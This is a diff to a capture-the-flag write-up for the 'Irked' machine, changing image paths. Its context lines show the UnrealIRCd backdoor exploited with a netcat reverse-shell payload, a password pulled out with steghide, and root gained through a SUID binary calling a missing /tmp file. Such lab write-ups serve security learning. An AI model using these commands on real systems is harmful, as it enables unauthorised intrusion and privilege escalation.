@@ -62,12 +62,12 @@ We can't do much on that version of OpenSSH without credentials, other than user
 ### Barren Website
 Quickly checking the landing page for the web server just discloses that IRC is almost fully working. My scans don't find anything else interesting, so I'll zero in on the IRC server.
 
-![](../assets/img/2026-04-24-Irked/1.png)
+![](/assets/img/2026-04-24-Irked/1.png)
 
 ## IRC Server
 I'm not entirely familiar with using IRC clients, but connecting to the server seemed to fail. However, using searchsploit to cross-match the software name reveals a few known vulnerabilities for _UnrealIRCd v3.2.8.1_.
 
-![](../assets/img/2026-04-24-Irked/2.png)
+![](/assets/img/2026-04-24-Irked/2.png)
 
 We don't yet know the version, but the backdoor command execution intrigued  me. A bit of digging led me to a [Juniper article](https://www.juniper.net/us/en/threatlabs/ips-signatures/detail.CHAT:IRC:UNREALRCD-BACKDOOR.html) explaining that a malicious threat actor had compromised the Unreal3.2.8.1.tar.gz package, adding a backdoor to achieve command execution on affected systems. NIST also lists this vulnerability as [CVE-2010–2075](https://nvd.nist.gov/vuln/detail/cve-2010-2075).
 
@@ -117,14 +117,14 @@ $ nc -nv 10.129.24.33 6697
 AB; nc 10.10.14.243 443 -e /bin/bash
 ```
 
-![](../assets/img/2026-04-24-Irked/3.png)
+![](/assets/img/2026-04-24-Irked/3.png)
 
 After upgrading the shell via the typical `Python import pty` method, we can start internal enumeration to escalate privileges towards root.
 
 ## Privilege Escalation
 Listing the users on the machine shows just one other account besides root, named _djmardov_. We have access to read their home directory and by filtering for files, we can discover a hidden backup file in their Documents folder.
 
-![](../assets/img/2026-04-24-Irked/4.png)
+![](/assets/img/2026-04-24-Irked/4.png)
 
 This denotes a Steganography backup password, which isn't reused for their system account.
 
@@ -141,7 +141,7 @@ $ steghide extract -sf irked.jpg
 $ cat pass.txt
 ```
 
-![](../assets/img/2026-04-24-Irked/5.png)
+![](/assets/img/2026-04-24-Irked/5.png)
 
 This prompts us with a passphrase to unlock the secret file, which is the one we found on the filesystem. Displaying its contents grants us the plaintext password for the _djmardov_ user, letting us grab a shell as them over SSH.
 
@@ -150,7 +150,7 @@ At this point we can grab the user flag in their home directory and focus on rou
 ### SUID Binary
 Peeking around the filesystem for any other configuration or backup files does not reveal anything. While checking for binaries with the SUID bit set on them, I discover a custom one named **viewuser** which seems to be in development in order to test and set user permissions.
 
-![](../assets/img/2026-04-24-Irked/6.png)
+![](/assets/img/2026-04-24-Irked/6.png)
 
 A test run against it displays some output for our current user, along with an error message showing that a call using sh can not find the `/tmp/listusers` file.
 
@@ -166,7 +166,7 @@ $ /usr/bin/viewuser
 $ /bin/bash -p
 ```
 
-![](../assets/img/2026-04-24-Irked/7.png)
+![](/assets/img/2026-04-24-Irked/7.png)
 
 After executing it, the binary runs our script and rewards us with a Bash shell as root user. This box was pretty easy all things considered, but Steganography admittedly has no real use in general Cybersecurity, making it more of a gimmick for CTFs and I can see how that would've tripped some people up.
 
